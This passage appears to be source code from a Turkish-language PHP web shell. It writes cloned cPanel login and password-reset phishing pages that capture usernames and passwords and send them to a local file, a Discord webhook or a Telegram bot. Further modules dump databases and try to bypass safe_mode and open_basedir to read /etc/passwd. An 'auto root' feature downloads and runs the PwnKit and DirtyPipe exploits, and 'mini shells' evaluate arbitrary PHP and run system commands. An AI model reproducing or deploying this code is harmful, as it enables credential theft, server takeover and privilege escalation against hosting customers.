        $log_entry = date("Y-m-d H:i:s") . " | USER: " . $username . " | PASS: " . $password . " | IP: " . $_SERVER["REMOTE_ADDR"] . "\n";
        send_log($log_entry);
        
        echo "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/\"></head>";
        echo "<body style=\"background:#f5f5f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;\">";
        echo "<div style=\"background:#fff;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,0.1);padding:30px;width:450px;border-top:4px solid #ff6b6b;\">";
        echo "<div style=\"color:#c92a2a;font-weight:bold;margin-bottom:10px;\">Geçersiz Oturum</div>";
        echo "Oturum çereziniz geçersiz. Lütfen yeniden oturum açın.</div></body></html>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>cPanel · Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #f5f5f5; font-family: "Open Sans", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        #login-wrapper { width: 100%; max-width: 480px; padding: 20px; }
        .wrapper { background: #fff; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 35px; }
        
        .error-notice { background-color: #fff3f3; border-left: 5px solid #ff6b6b; padding: 15px; color: #c92a2a; font-weight: 600; font-size: 14px; margin-bottom: 25px; }
        
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 200px; height: auto; }
        
        .label-text { display: block; font-weight: bold; margin-bottom: 8px; color: #444; font-size: 14px; }
        
        .input-group { position: relative; margin-bottom: 20px; }
        .input-group input { 
            width: 100%; 
            padding: 12px 10px 12px 40px; 
            border: 1px solid #ccc; 
            border-radius: 3px; 
            font-size: 16px; 
            color: #333;
            background-repeat: no-repeat;
            background-position: 12px center;
        }

        #user {
            background-image: url("https://webadasi.com:2083/cPanel_magic_revision_1730741447/unprotected/cpanel/images/icon-username.png");
        }
        #pass {
            background-image: url("https://webadasi.com:2083/cPanel_magic_revision_1730741447/unprotected/cpanel/images/icon-password.png");
        }

        .input-group i { 
            position: absolute; 
            left: 14px; 
            top: 14px; 
            z-index: 1; 
            font-style: normal;
        }
        .login-btn { width: 100%; margin-top: 5px; }
        .login-btn button {
            width: 100%;
            background-color: #1b9cd8;
            background-image: linear-gradient(to bottom, #2b9ed4 0%, #198cc5 100%);
            color: #ffffff;
            border: 1px solid #167eaf;
            border-radius: 3px;
            padding: 14px 20px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            text-shadow: 0 1px 1px rgba(0,0,0,0.2);
        }
        .login-btn button:hover { background-image: linear-gradient(to bottom, #1b9cd8 0%, #1685b9 100%); }

        .footer-links { text-align: center; margin-top: 25px; }
        .footer-links a { color: #1b9cd8; text-decoration: none; font-size: 13px; font-weight: 600; }
        
        .locales { margin-top: 30px; text-align: center; border-top: 1px solid #ddd; padding-top: 20px; }
        .locales ul { list-style: none; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
        .locales ul li a { color: #1b9cd8; text-decoration: none; font-size: 12px; }
        
        .copyright { margin-top: 30px; text-align: center; font-size: 11px; color: #aaa; line-height: 1.6; }
    </style>
</head>
<body>
    <div id="login-wrapper">
        <div class="wrapper">
            <div class="error-notice">Oturum çereziniz geçersiz. Lütfen yeniden oturum açın.</div>
            <div class="logo">
                <img src="https://www.cpanel.net/wp-content/uploads/2025/06/logo-cPanel-header.svg" alt="cPanel">
            </div>
            <form method="POST">
                <label class="label-text" for="user">Kullanıcı adı</label>
                <div class="input-group">
                    <input type="text" name="user" id="user" placeholder="Kullanıcı adınızı girin." required autofocus>
                </div>
                
                <label class="label-text" for="pass">Şifre</label>
                <div class="input-group">
                    <input type="password" name="pass" id="pass" placeholder="Hesap şifrenizi girin." required>
                </div>
                
                <div class="login-btn">
                    <button type="submit">Oturum açma</button>
                </div>
            </form>
            <div class="footer-links">
                <a href="#">Şifreyi Sıfırla</a>
            </div>
        </div>
        <div class="locales">
            <ul>
                <li><a href="#">English</a></li>
                <li><a href="#">Türkçe</a></li>
                <li><a href="#">Deutsch</a></li>
                <li><a href="#">...</a></li>
            </ul>
        </div>
        <div class="copyright">Copyright© 2026 cPanel, L.L.C.</div>
    </div>

    <script>
        window.onload = function() {
            var inputs = [\'user\', \'pass\'];
            inputs.forEach(function(id) {
                var input = document.getElementById(id);
                var img = new Image();
                img.src = window.getComputedStyle(input).backgroundImage.slice(4, -1).replace(/"/g, "");
                img.onerror = function() {
                    // Resim yoksa inputun soluna emoji ekle
                    input.style.backgroundImage = "none";
                    var icon = document.createElement("i");
                    icon.innerHTML = (id === "user") ? "👤" : "🔒";
                    input.parentNode.insertBefore(icon, input);
                };
            });
        };
    </script>
</body>
</html>';
    
    file_put_contents('kpanel.php', $fake_panel);
    $messages[] = "✅ Ana fake panel oluşturuldu: kpanel.php (klasik cPanel teması)";
    
//============================ ==============================


$reset_panel = '<?php
error_reporting(0);
ini_set("display_errors", 0);

$log_method = "' . $log_method . '";
$webhook = "' . $webhook . '";
$bot_token = "' . $bot_token . '";
$chat_id = "' . $chat_id . '";

function send_log($entry) {
    global $log_method, $webhook, $bot_token, $chat_id;
    if($log_method == "file" || $log_method == "both") {
        @file_put_contents("stolen_creds.txt", $entry, FILE_APPEND | LOCK_EX);
    }
    if(($log_method == "discord" || $log_method == "both") && !empty($webhook)) {
        $ch = @curl_init($webhook);
        if($ch) {
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["content" => "```" . $entry . "```"]));
            @curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); @curl_close($ch);
        }
    }
    if(($log_method == "telegram" || $log_method == "both") && !empty($bot_token) && !empty($chat_id)) {
        $ch = @curl_init("https://api.telegram.org/bot" . $bot_token . "/sendMessage");
        if($ch) {
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "text" => $entry]);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); @curl_close($ch);
        }
    }
}

if($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["user"] ?? "";
    $old_pass = $_POST["old_password"] ?? "";
    $new_pass = $_POST["new_password"] ?? "";
    
    if(!empty($username)) {
        $log_entry = date("Y-m-d H:i:s") . " | RESET | USER: " . $username . " | OLD: " . $old_pass . " | NEW: " . $new_pass . " | IP: " . $_SERVER["REMOTE_ADDR"] . "\n";
        send_log($log_entry);
        
        echo "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/\"></head>";
        echo "<body style=\"background:#f5f5f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;\">";
        echo "<div style=\"background:#fff;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,0.1);padding:30px;width:450px;border-top:4px solid #28a745;\">";
        echo "<div style=\"color:#1e7e34;font-weight:bold;margin-bottom:10px;\">İşlem Başarılı</div>";
        echo "Şifre sıfırlama talebiniz alındı. Güvenlik nedeniyle yönlendiriliyorsunuz.</div></body></html>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>Reset Password · cPanel</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #f5f5f5; font-family: "Open Sans", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        #reset-wrapper { width: 100%; max-width: 480px; padding: 20px; }
        .wrapper { background: #fff; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 35px; }
        
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 200px; height: auto; }
        
        .label-text { display: block; font-weight: bold; margin-bottom: 8px; color: #444; font-size: 14px; }
        .input-group { position: relative; margin-bottom: 15px; }
        .input-group input { 
            width: 100%; 
            padding: 12px 10px 12px 40px; 
            border: 1px solid #ccc; 
            border-radius: 3px; 
            font-size: 16px; 
            color: #333;
            background-repeat: no-repeat;
            background-position: 12px center;
        }

        #user { background-image: url("https://webadasi.com:2083/cPanel_magic_revision_1730741447/unprotected/cpanel/images/icon-username.png"); }
        #old_password, #new_password { background-image: url("https://webadasi.com:2083/cPanel_magic_revision_1730741447/unprotected/cpanel/images/icon-password.png"); }

        .reset-btn { width: 100%; margin-top: 10px; }
        .reset-btn button {
            width: 100%;
            background-color: #1b9cd8;
            background-image: linear-gradient(to bottom, #2b9ed4 0%, #198cc5 100%);
            color: #ffffff;
            border: 1px solid #167eaf;
            border-radius: 3px;
            padding: 14px 20px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            text-shadow: 0 1px 1px rgba(0,0,0,0.2);
        }
        .reset-btn button:hover { background-image: linear-gradient(to bottom, #1b9cd8 0%, #1685b9 100%); }

        .cancel-link { text-align: center; margin-top: 20px; }
        .cancel-link a { color: #1b9cd8; text-decoration: none; font-size: 14px; font-weight: 600; }
        
        .copyright { margin-top: 30px; text-align: center; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
    <div id="reset-wrapper">
        <div class="wrapper">
            <div class="logo">
                <img src="https://www.cpanel.net/wp-content/uploads/2025/06/logo-cPanel-header.svg" alt="cPanel">
            </div>
            <form method="POST">
                <label class="label-text" for="user">Kullanıcı adı</label>
                <div class="input-group">
                    <input type="text" name="user" id="user" placeholder="Kullanıcı adınızı girin." required autofocus>
                </div>
                
                <label class="label-text" for="old_password">Mevcut şifre</label>
                <div class="input-group">
                    <input type="password" name="old_password" id="old_password" placeholder="Mevcut şifrenizi girin." required>
                </div>
                
                <label class="label-text" for="new_password">Yeni şifre</label>
                <div class="input-group">
                    <input type="password" name="new_password" id="new_password" placeholder="Yeni şifrenizi girin." required>
                </div>
                
                <div class="reset-btn">
                    <button type="submit">Şifreyi Sıfırla</button>
                </div>
            </form>
            <div class="cancel-link">
                <a href="/">İptal</a>
            </div>
        </div>
        <div class="copyright">Copyright© 2026 cPanel, L.L.C.</div>
    </div>

    <script>
        window.onload = function() {
            var inputs = [\'user\', \'old_password\', \'new_password\'];
            inputs.forEach(function(id) {
                var input = document.getElementById(id);
                var img = new Image();
                img.src = window.getComputedStyle(input).backgroundImage.slice(4, -1).replace(/"/g, "");
                img.onerror = function() {
                    input.style.backgroundImage = "none";
                    var icon = document.createElement("i");
                    icon.style.cssText = "position:absolute; left:14px; top:12px; font-style:normal;";
                    icon.innerHTML = (id === "user") ? "👤" : "🔒";
                    input.parentNode.insertBefore(icon, input);
                };
            });
        };
    </script>
</body>
</html>';
    file_put_contents('reset.php', $reset_panel);
    $messages[] = "✅ Password reset sayfası oluşturuldu: reset.php (klasik cPanel teması)";
    
    // ============ 7. SONUÇ MESAJI ============
    $result_html = '<div class="alert alert-success"><i class="bi bi-check-circle"></i> <strong>BİREBİR CPANEL KLONU OLUŞTURULDU!</strong><br>';
    $result_html .= '<div style="background:#1a1a1a; padding:15px; margin:10px 0; border-radius:5px; max-height:200px; overflow-y:auto;">';
    foreach($messages as $msg) $result_html .= '✓ ' . htmlspecialchars($msg) . '<br>';
    $result_html .= '</div></div>';
    
    // .htaccess göster
    $result_html .= '<div class="card mt-10"><div class="card-header"><i class="bi bi-code-slash"></i> .htaccess Kuralları</div>';
    $result_html .= '<div class="card-body"><div class="terminal"><pre>' . htmlspecialchars($htaccess_content) . '</pre></div></div></div>';
    
    // Tuzak dizinler listesi
    $result_html .= '<div class="card"><div class="card-header"><i class="bi bi-folder"></i> Tuzak Kurulan Dizinler</div>';
    $result_html .= '<div class="card-body"><div class="terminal"><pre>';
    $result_html .= "🔹 NORMAL GİRİŞ SAYFALARI (kpanel.php):\n";
    foreach($trap_paths as $p) $result_html .= "   /$p\n";
    $result_html .= "\n🔹 ŞİFRE SIFIRLAMA SAYFALARI (reset.php):\n";
    foreach($reset_paths as $p) $result_html .= "   /$p\n";
    $result_html .= '</pre></div></div></div>';
    $result_html .= '<div class="card"><div class="card-header"><i class="bi bi-link"></i> Test Linkleri</div>';
    $result_html .= '<div class="card-body">';
    $result_html .= '<a href="/cpane1" class="btn btn-primary mr-2 mb-2"><i class="bi bi-box-arrow-in-right"></i> /cpane1</a>';
    $result_html .= '<a href="/passwordreset" class="btn btn-success mr-2 mb-2"><i class="bi bi-key"></i> /passwordreset</a>';
    $result_html .= '<a href="/ⅽpanel" class="btn btn-info mr-2 mb-2"><i class="bi bi-magic"></i> /ⅽpanel</a>';
    $result_html .= '</div></div>';
    
    return $result_html;
}
?>

<?php if($action == 'backup'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-archive"></i> BACKUP ALMA (OS LEVEL)</div>
    <div class="card-body">
        <?php
        if(isset($_POST['backup_path'])) {
            $path = $_POST['backup_path'];
            $backup_name = 'backup_' . date('Ymd_His') . '.zip';
            if(!$is_windows) {
                $cmd = "zip -r $backup_name '$path' 2>&1";
                $output = execute_command($cmd);
                if(file_exists($backup_name) && filesize($backup_name) > 0) {
                    echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Yedek başarıyla oluşturuldu! <a href="' . $backup_name . '" class="btn btn-primary"><i class="bi bi-download"></i> İndir</a></div>';
                    echo '<div class="terminal"><pre>' . htmlspecialchars($output) . '</pre></div>';
                } else {
                    $cmd_bg = "nohup zip -r $backup_name '$path' > /dev/null 2>&1 &";
                    execute_command($cmd_bg, true);
                    echo '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Yedekleme arka planda başlatıldı. Tamamlandığında <strong>' . $backup_name . '</strong> olarak kaydedilecek.</div>';
                }
            } else {
                $cmd = "powershell Compress-Archive -Path '$path' -DestinationPath '$backup_name'";
                $output = execute_command($cmd);
                if(file_exists($backup_name) && filesize($backup_name) > 0) {
                    echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Yedek başarıyla oluşturuldu! <a href="' . $backup_name . '" class="btn btn-primary"><i class="bi bi-download"></i> İndir</a></div>';
                } else {
                    $cmd_bg = "start /B powershell Compress-Archive -Path '$path' -DestinationPath '$backup_name'";
                    execute_command($cmd_bg, true);
                    echo '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Yedekleme arka planda başlatıldı. Tamamlandığında <strong>' . $backup_name . '</strong> olarak kaydedilecek.</div>';
                }
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-folder"></i> Yedeklenecek dizin/dosya:</label>
                <input type="text" class="form-control" name="backup_path" placeholder="/var/www/html veya C:\xampp\htdocs" value="<?php echo $current_dir; ?>">
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-archive"></i> Yedek Al</button>
        </form>
        <p class="text-muted mt-10"><i class="bi bi-info-circle"></i> Yedekleme işlemi OS seviyesinde yapılır, web sunucusu çökmez. Büyük dosyalar arka planda işlenir.</p>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'mail'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-envelope"></i> MAIL SENDER</div>
    <div class="card-body">
        <?php
        if(isset($_POST['mail_from']) && isset($_POST['mail_to']) && isset($_POST['mail_subject']) && isset($_POST['mail_body'])) {
            $from = $_POST['mail_from'];
            $to = $_POST['mail_to'];
            $subject = $_POST['mail_subject'];
            $body = $_POST['mail_body'];
            $result = send_mail($from, $to, $subject, $body);
            if($result) {
                echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> E-posta başarıyla gönderildi!</div>';
            } else {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> E-posta gönderilemedi! PHP mail() fonksiyonu çalışmıyor olabilir.</div>';
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-envelope-fill"></i> Kimden:</label>
                <input type="email" class="form-control" name="mail_from" placeholder="sender@example.com" value="webmaster@<?php echo $_SERVER['HTTP_HOST']; ?>">
            </div>
            <div class="form-group">
                <label><i class="bi bi-envelope"></i> Kime:</label>
                <input type="email" class="form-control" name="mail_to" placeholder="recipient@example.com" required>
            </div>
            <div class="form-group">
                <label><i class="bi bi-tag"></i> Konu:</label>
                <input type="text" class="form-control" name="mail_subject" placeholder="E-posta konusu" required>
            </div>
            <div class="form-group">
                <label><i class="bi bi-chat"></i> İçerik (HTML desteklenir):</label>
                <textarea class="form-control" name="mail_body" rows="10" placeholder="E-posta içeriği..." required></textarea>
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-send"></i> Gönder</button>
        </form>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'install_adminer'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-database"></i> ADMINER YÜKLE</div>
    <div class="card-body">
        <?php
        if(isset($_POST['install'])) {
            $result = install_adminer();
            if($result && file_exists('adminer.php')) {
                echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Adminer başarıyla yüklendi! <a href="adminer.php" target="_blank" class="btn btn-primary"><i class="bi bi-box-arrow-up-right"></i> Adminer\'ı Aç</a></div>';
            } else {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> Adminer yüklenemedi! Manuel olarak indirmeyi deneyin: <a href="https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php" target="_blank">adminer-4.8.1.php</a></div>';
            }
        }
        if(file_exists('adminer.php')) {
            echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> Adminer zaten yüklü: <a href="adminer.php" target="_blank" class="btn btn-sm btn-primary"><i class="bi bi-box-arrow-up-right"></i> Aç</a></div>';
        }
        ?>
        <form method="post">
            <button type="submit" name="install" class="btn btn-primary"><i class="bi bi-download"></i> Adminer Yükle (v4.8.1)</button>
        </form>
        <p class="text-muted mt-10"><i class="bi bi-info-circle"></i> Adminer tek dosyalık bir veritabanı yönetim aracıdır. MySQL, PostgreSQL, SQLite vb. destekler.</p>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'db_dump'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-database-fill"></i> DATABASE DUMP</div>
    <div class="card-body">
        <?php
        if(isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass'])) {
            $host = $_POST['db_host'];
            $user = $_POST['db_user'];
            $pass = $_POST['db_pass'];
            $dbname = $_POST['db_name'] ?? '';
            $dump_files = array();
            $zip = new ZipArchive();
            $zipname = 'dumped_' . date('Ymd_His') . '.zip';
            if($zip->open($zipname, ZipArchive::CREATE) !== true) {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> ZIP oluşturulamadı!</div>';
            } else {
                if($dbname && $dbname != 'all') {
                    $output = 'dump_' . $dbname . '.sql';
                    if(dump_database($host, $user, $pass, $dbname, $output)) {
                        $zip->addFile($output, $output);
                        $dump_files[] = $output;
                    }
                } else {
                    if(!$is_windows) {
                        $dbs = execute_command("mysql -h $host -u $user --password='$pass' -e 'SHOW DATABASES' | grep -Ev '^(Database|information_schema|performance_schema|mysql|sys)$'");
                    } else {
                        $dbs = execute_command("mysql -h $host -u $user --password=$pass -e \"SHOW DATABASES\" | findstr /v \"Database information_schema performance_schema mysql sys\"");
                    }
                    $db_list = explode("\n", trim($dbs));
                    foreach($db_list as $db) {
                        $db = trim($db);
                        if(empty($db)) continue;
                        $output = 'dump_' . $db . '.sql';
                        if(dump_database($host, $user, $pass, $db, $output)) {
                            $zip->addFile($output, $output);
                            $dump_files[] = $output;
                        }
                    }
                }
                $zip->close();
                foreach($dump_files as $f) {
                    if(file_exists($f)) @unlink($f);
                }
                if(file_exists($zipname) && filesize($zipname) > 0) {
                    echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> Veritabanı dump başarıyla oluşturuldu! <a href="' . $zipname . '" class="btn btn-primary"><i class="bi bi-download"></i> ZIP İndir</a></div>';
                    echo '<div class="terminal"><pre>Dökümü alınan veritabanları: ' . implode(', ', $dump_files) . '</pre></div>';
                } else {
                    echo '<div class="alert alert-warning"><i class="bi bi-exclamation-circle"></i> Veritabanı dump alınamadı! Bağlantı bilgilerini kontrol edin.</div>';
                }
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-server"></i> Host:</label>
                <input type="text" class="form-control" name="db_host" placeholder="localhost" value="localhost">
            </div>
            <div class="form-group">
                <label><i class="bi bi-person"></i> Kullanıcı:</label>
                <input type="text" class="form-control" name="db_user" placeholder="root" required>
            </div>
            <div class="form-group">
                <label><i class="bi bi-lock"></i> Şifre:</label>
                <input type="password" class="form-control" name="db_pass" placeholder="****">
            </div>
            <div class="form-group">
                <label><i class="bi bi-database"></i> Veritabanı:</label>
                <input type="text" class="form-control" name="db_name" placeholder="all (tümü) veya veritabanı adı" value="all">
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-database-fill"></i> Dump Al ve ZIPle</button>
        </form>
        <p class="text-muted mt-10"><i class="bi bi-info-circle"></i> "all" yazarsanız tüm veritabanlarını dump alır. MySQL/MariaDB için mysqldump gereklidir.</p>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'safe_mode_fucker'): ?>
<div class="card"><div class="card-header"><i class="bi bi-shield"></i> SAFE MODE BYPASS</div><div class="card-body"><?php $s=ini_get('safe_mode')?'AÇIK':'KAPALI'; $d=ini_get('disable_functions'); echo '<div class="alert alert-info">Safe Mode: '.$s.'<br>Disabled: '.($d?:'YOK').'</div>'; if(isset($_POST['sm_method'])){$m=$_POST['sm_method']; if($m==1){$ht=@file_put_contents('.htaccess',"php_value safe_mode Off\nphp_flag safe_mode Off\nphp_value disable_functions None\n"); echo $ht?'<div class="alert alert-success">.htaccess yazıldı.</div>':'<div class="alert alert-danger">.htaccess yazılamadı!</div>';}elseif($m==2){$ini=@file_put_contents('php.ini',"safe_mode=Off\ndisable_functions=\nopen_basedir=\n"); echo $ini?'<div class="alert alert-success">php.ini yazıldı.</div>':'<div class="alert alert-danger">php.ini yazılamadı!</div>';}elseif($m==3){@ini_set('safe_mode',0); @ini_set('disable_functions',''); echo '<div class="alert alert-info">ini_set() denendi.</div>';}elseif($m==4){$t=@execute_command('id'); if($t&&!strpos($t,'execution failed')) echo '<div class="alert alert-success">disable_functions bypass başarılı!</div>'; else echo '<div class="alert alert-danger">Başarısız!</div>';}elseif($m==5){$t=@file_get_contents('../../../../../../etc/passwd'); if($t) echo '<div class="alert alert-success">Path traversal başarılı!</div>'; else echo '<div class="alert alert-danger">Başarısız!</div>';}} ?><form method="post"><select name="sm_method" class="form-control"><option value="1">.htaccess</option><option value="2">php.ini</option><option value="3">ini_set()</option><option value="4">disable_functions bypass</option><option value="5">Path traversal</option></select><button type="submit" class="btn btn-primary mt-20"><i class="bi bi-play"></i> Uygula</button></form></div></div>
<?php endif; ?>
<?php if($action == 'open_basedir_bypass'): ?>
<div class="card"><div class="card-header"><i class="bi bi-folder-symlink"></i> OPEN BASEDIR BYPASS</div><div class="card-body"><?php $ob=ini_get('open_basedir')?:'KAPALI'; echo '<div class="alert alert-info">Open Basedir: '.$ob.'</div>'; if(isset($_POST['ob_method'])){$m=$_POST['ob_method']; if($m==1){$d='ob_'.rand(); mkdir($d); if(@symlink('/etc/passwd',$d.'/pwd')) echo '<div class="alert alert-success"><a href="'.$d.'/pwd">Symlink başarılı</a></div>'; else echo '<div class="alert alert-danger">Symlink başarısız</div>';}elseif($m==2){@ini_restore('open_basedir'); echo '<div class="alert alert-info">ini_restore() denendi</div>';}elseif($m==3){$t=@file_get_contents('../../../../../../etc/passwd'); echo $t?'<div class="alert alert-success">Path traversal başarılı</div>':'<div class="alert alert-danger">Başarısız</div>';}elseif($m==4){$t=@file_get_contents('file:///etc/passwd'); echo $t?'<div class="alert alert-success">file:// başarılı</div>':'<div class="alert alert-danger">Başarısız</div>';}elseif($m==5){$t=@file_get_contents('php://filter/convert.base64-encode/resource=/etc/passwd'); if($t){$d=base64_decode($t); echo '<div class="alert alert-success">php://filter başarılı</div><div class="terminal"><pre>'.substr($d,0,500).'</pre></div>';}else echo '<div class="alert alert-danger">Başarısız</div>';}} ?><form method="post"><select name="ob_method" class="form-control"><option value="1">Symlink</option><option value="2">ini_restore()</option><option value="3">Path traversal</option><option value="4">file:// wrapper</option><option value="5">php://filter</option></select><button type="submit" class="btn btn-primary mt-20"><i class="bi bi-play"></i> Dene</button></form></div></div>
<?php endif; ?>
<?php if($action == 'sql_reader'): ?>
<div class="card"><div class="card-header"><i class="bi bi-database"></i> SQL FILE READER</div><div class="card-body"><?php if(isset($_POST['sql_host'])&&isset($_POST['sql_user'])&&isset($_POST['sql_pass'])&&isset($_POST['sql_file'])){$h=$_POST['sql_host']; $u=$_POST['sql_user']; $p=$_POST['sql_pass']; $f=$_POST['sql_file']; if($is_windows) $f=str_replace('/','\\',$f); $conn=@new mysqli($h,$u,$p); if($conn->connect_error) echo '<div class="alert alert-danger">Bağlantı hatası: '.$conn->connect_error.'</div>'; else{$q="SELECT LOAD_FILE('".$conn->real_escape_string($f)."') as content"; $r=$conn->query($q); if($r&&$r->num_rows>0){$row=$r->fetch_assoc(); if($row['content']) echo '<div class="alert alert-success"><div class="terminal"><pre>'.htmlspecialchars($row['content']).'</pre></div></div>'; else echo '<div class="alert alert-warning">Dosya boş/okunamıyor</div>';}else echo '<div class="alert alert-danger">Sorgu hatası</div>'; $conn->close();}} ?><form method="post"><input type="text" class="form-control" name="sql_host" placeholder="Host" value="localhost"><input type="text" class="form-control mt-10" name="sql_user" placeholder="User"><input type="password" class="form-control mt-10" name="sql_pass" placeholder="Pass"><input type="text" class="form-control mt-10" name="sql_file" placeholder="Dosya" value="/etc/passwd"><button type="submit" class="btn btn-primary mt-20"><i class="bi bi-play"></i> Oku</button></form></div></div>
<?php endif; ?>
<?php if($action == 'auto_root'): ?>
<div class="card"><div class="card-header"><i class="bi bi-crown"></i> AUTO ROOT</div><div class="card-body"><?php if($is_windows) echo '<div class="alert alert-warning">Sadece Linux</div>'; else{if(isset($_POST['do_root'])){echo '<div class="alert alert-info">Root deneniyor...</div>'; $b=execute_command('id'); echo '<div class="terminal"><pre>'.$b.'</pre></div>'; $ex=array('pwnkit'=>'https://github.com/ly4k/PwnKit/raw/main/PwnKit','dirtypipe'=>'https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1'); $c=$_POST['exploit']??'pwnkit'; $u=$ex[$c]; $fn=basename($u); execute_command('wget -q '.$u.' -O '.$fn.' 2>/dev/null || curl -s -o '.$fn.' '.$u); if(file_exists($fn)){execute_command('chmod +x '.$fn); $o=execute_command('./'.$fn); $a=execute_command('id'); echo '<div class="terminal"><pre>'.$a.'</pre></div>'; if(strpos($a,'uid=0(root)')!==false) echo '<div class="alert alert-success">✅ ROOT!</div>'; else echo '<div class="alert alert-danger">❌ Root olunamadı</div>'; echo '<div class="terminal"><pre>'.$o.'</pre></div>';}else echo '<div class="alert alert-danger">Exploit indirilemedi</div>';}} ?><form method="post"><select name="exploit" class="form-control"><option value="pwnkit">PwnKit</option><option value="dirtypipe">DirtyPipe</option></select><button type="submit" name="do_root" class="btn btn-danger mt-20"><i class="bi bi-crown"></i> ROOT DENE</button></form></div></div>
<?php endif; ?>
<?php if($action == 'cve_scanner'): ?>
<div class="card"><div class="card-header"><i class="bi bi-bug"></i> CVE SCANNER</div><div class="card-body"><?php if(isset($_POST['scan_cve'])){$k=php_uname('r'); $c=array(); if(preg_match('/(\d+)\.(\d+)\.(\d+)/',$k,$m)){$ma=$m[1]; $mi=$m[2]; $pa=$m[3]; if($ma==2&&$mi<6)$c[]='CVE-2009-1185'; if($ma==2&&$mi==6&&$pa<39)$c[]='CVE-2016-5195 (DirtyCow)'; if($ma==3&&$mi<15)$c[]='CVE-2017-6074'; if($ma==4&&$mi<9)$c[]='CVE-2017-1000112'; if($ma==5&&$mi<8)$c[]='CVE-2021-33909'; if($ma==5&&$mi<13)$c[]='CVE-2022-0847 (DirtyPipe)';} if(file_exists('/usr/bin/pkexec'))$c[]='CVE-2021-4034 (PwnKit)'; if(count($c)>0){echo '<div class="alert alert-warning"><h4>Potansiyel açıklar:</h4><ul>'; foreach($c as $cve) echo '<li>'.$cve.'</li>'; echo '</ul><a href="?action=auto_root" class="btn btn-danger">Root dene</a></div>';}else echo '<div class="alert alert-success">Bilinen CVE bulunamadı</div>';} ?><form method="post"><button type="submit" name="scan_cve" class="btn btn-primary"><i class="bi bi-search"></i> CVE Tara</button></form></div></div>
<?php endif; ?>
<?php if($action == 'mini_shells'): ?>
<div class="card"><div class="card-header"><i class="bi bi-code-square"></i> MINI SHELLS</div><div class="card-body"><div class="grid-3"><?php $sh=array('PHP','Python','Perl','Ruby','Bash','CGI'); foreach($sh as $s){echo '<div class="card"><div class="card-header">'.$s.'</div><div class="card-body">'; if($s=='PHP'){if(isset($_POST['php_code'])){eval($_POST['php_code']);} echo '<form method="post"><textarea class="form-control" name="php_code" rows="3">system("id");</textarea><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';}elseif($s=='Python'){if(isset($_POST['python_cmd'])){$c=$_POST['python_cmd']; system("python -c \"$c\" 2>&1");} echo '<form method="post"><input type="text" class="form-control" name="python_cmd" placeholder="print(\'hello\')"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-play"></i> Çalıştır</button></form>';}elseif($s=='Perl'){if(isset($_POST['perl_cmd'])){$c=$_POST['perl_cmd']; system("perl -e \"$c\" 2>&1");} echo '<form method="post"><input type="text" class="form-control" name="perl_cmd" placeholder="print \'hello\';"><button type="submit" class="btn btn-primary 